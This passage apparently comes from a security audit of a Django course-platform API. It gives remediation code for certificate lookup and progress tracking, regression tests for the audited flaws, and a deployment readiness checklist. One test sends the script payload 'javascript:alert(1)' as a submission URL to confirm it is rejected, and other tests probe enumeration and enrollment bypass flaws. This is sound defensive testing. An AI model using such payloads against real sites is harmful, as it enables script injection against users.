            submission.save()

            # Handle associated lesson progress upon approval/rejection
            if assignment.lesson:
                enrollment = Enrollment.objects.filter(
                    user=submission.learner,
                    course=assignment.course
                ).first()
                if enrollment:
                    progress, _ = LessonProgress.objects.get_or_create(
                        enrollment=enrollment,
                        lesson=assignment.lesson
                    )
                    if verdict == SubmissionStatus.APPROVED:
                        progress.is_completed = True
                        progress.completed_at = timezone.now()
                    else:
                        progress.is_completed = False
                        progress.completed_at = None
                    progress.save()
                    enrollment.recalculate_progress()

        return Response({
            'detail': f'Submission marked as {verdict}.',
            'submission': AssignmentSubmissionSerializer(submission).data
        })


# 4. CourseCompletionViewSet: Retrieve-Only (Prevent Mass Certificate Enumeration)
class CourseCompletionViewSet(mixins.RetrieveModelMixin, viewsets.GenericViewSet):
    """
    Public verification endpoint for educational completion certificates.
    Only allows retrieving a specific certificate by its unique code:
    GET /api/v1/courses/certificates/<certificate_code>/
    List action is disabled to prevent student PII harvesting.
    """
    queryset = CourseCompletion.objects.select_related('enrollment__course', 'enrollment__user')
    serializer_class = CourseCompletionSerializer
    lookup_field = 'certificate_code'
    permission_classes = [AllowAny]
```

---

### 4.3 Remediation for `backend/apps/courses/models.py` (`recalculate_progress`)
In `Enrollment.recalculate_progress`, wrap the logic in a transaction with row locking and catch duplicate key errors:

```python
    def recalculate_progress(self):
        """
        Recalculates completed lesson percentage and triggers completion when 100% is reached.
        Thread-safe, atomic, and prevents duplicate certificate generation crashes.
        """
        with transaction.atomic():
            locked_self = Enrollment.objects.select_for_update().get(id=self.id)
            total_lessons = Lesson.objects.filter(module__course=locked_self.course).count()
            if total_lessons == 0:
                locked_self.progress_percent = 0
                locked_self.save(update_fields=['progress_percent'])
                return 0

            completed_count = locked_self.lesson_progress.filter(is_completed=True).count()
            percent = int(min(100, round((completed_count / total_lessons) * 100)))
            locked_self.progress_percent = percent

            if percent >= 100 and locked_self.status != EnrollmentStatus.COMPLETED:
                locked_self.status = EnrollmentStatus.COMPLETED
                locked_self.completed_at = timezone.now()
                locked_self.save(update_fields=['progress_percent', 'status', 'completed_at'])

                # Issue educational certificate idempotently
                if not CourseCompletion.objects.filter(enrollment=locked_self).exists():
                    year = timezone.now().year
                    short_hash = uuid.uuid4().hex[:8].upper()
                    cert_code = f"ENQ-ACAD-{year}-{short_hash}"
                    CourseCompletion.objects.get_or_create(
                        enrollment=locked_self,
                        defaults={
                            'certificate_code': cert_code,
                            'grade_summary': {'completed_lessons': completed_count, 'total_lessons': total_lessons}
                        }
                    )
            else:
                locked_self.save(update_fields=['progress_percent'])

            self.progress_percent = locked_self.progress_percent
            self.status = locked_self.status
            return percent
```

---

## 5. Security Regression Test Suite

The following comprehensive automated tests should be added to `backend/apps/courses/tests.py` to prevent regressions:

```python
class AcademySecurityHardeningTests(AcademyBaseTestCase):
    """Verifies that all 12 audited vulnerabilities are prevented."""

    def test_sec01_anonymous_cannot_list_all_lessons(self):
        """Anonymous user must not be able to list / dump lessons."""
        res = self.client.get('/api/v1/courses/lessons/')
        # RetrieveModelMixin returns 405 Method Not Allowed; permission class returns 403 Forbidden
        self.assertIn(res.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_405_METHOD_NOT_ALLOWED])

    def test_sec02_premium_and_campus_enrollment_blocked(self):
        """Unverified/free users cannot enroll in premium or campus-restricted courses."""
        self.course.access_tier = AccessTier.PREMIUM
        self.course.price_inr = 2999
        self.course.save()

        self.client.force_authenticate(user=self.learner)
        res = self.client.post(f'/api/v1/courses/{self.course.slug}/enroll/')
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

    def test_sec03_anonymous_cannot_enumerate_all_certificates(self):
        """Certificate list endpoint must be disabled."""
        res = self.client.get('/api/v1/courses/certificates/')
        self.assertIn(res.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_405_METHOD_NOT_ALLOWED])

    def test_sec04_assignment_submission_does_not_prematurely_complete_lesson(self):
        """Submitting an assignment must not mark lesson complete until instructor approval."""
        Enrollment.objects.create(user=self.learner, course=self.course)
        self.client.force_authenticate(user=self.learner)

        res = self.client.post(f'/api/v1/courses/assignments/{self.assignment.id}/submit/', {
            'repository_url': 'https://github.com/learner/repo',
            'submission_text': 'Done'
        })
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)

        # Progress on assignment lesson must still be incomplete
        progress = LessonProgress.objects.filter(enrollment__user=self.learner, lesson=self.lesson2).first()
        self.assertTrue(progress is None or not progress.is_completed)

    def test_sec05_instructor_cannot_review_own_submission(self):
        """Instructors cannot approve their own submissions."""
        Enrollment.objects.create(user=self.instructor, course=self.course)
        sub = AssignmentSubmission.objects.create(
            assignment=self.assignment,
            learner=self.instructor,
            repository_url='https://github.com/alice/repo',
            submission_text='Self build'
        )
        self.client.force_authenticate(user=self.instructor)
        res = self.client.post(f'/api/v1/courses/assignments/{self.assignment.id}/review/', {
            'submission_id': str(sub.id),
            'status': SubmissionStatus.APPROVED
        })
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)

    def test_sec06_unsafe_url_schemes_rejected(self):
        """javascript: and data: URIs must be rejected on assignment submit."""
        Enrollment.objects.create(user=self.learner, course=self.course)
        self.client.force_authenticate(user=self.learner)

        res = self.client.post(f'/api/v1/courses/assignments/{self.assignment.id}/submit/', {
            'repository_url': 'javascript:alert(1)',
            'submission_text': 'Exploit'
        })
        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)

    def test_sec09_invalid_uuid_in_review_returns_400(self):
        """Malformed submission_id UUID must return 400 Bad Request, never 500."""
        self.client.force_authenticate(user=self.instructor)
        res = self.client.post(f'/api/v1/courses/assignments/{self.assignment.id}/review/', {
            'submission_id': 'not-a-valid-uuid',
            'status': SubmissionStatus.APPROVED
        })
        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)
```

---

## 6. Conclusion & Deployment Readiness Gate

The ENQUEbet Academy API is architecturally sound and preserves the critical domain invariant: **CourseCompletions are purely academic milestones and do not mint ProofOfWork or increment user reputation**.

However, **production deployment must be gated until the remediations in Section 4 are applied**, particularly:
1. Blocking the `LessonViewSet.list` curriculum dump.
2. Securing `CourseViewSet.enroll` against free access to premium/campus courses.
3. Disabling `CourseCompletionViewSet.list` to protect student privacy.
4. Restricting assignment lesson completion until verified review approval.
5. Enforcing `http`/`https` URL validation on student deliverables.
6. Wrapping progress updates and certificate minting in atomic transactions with row locks.
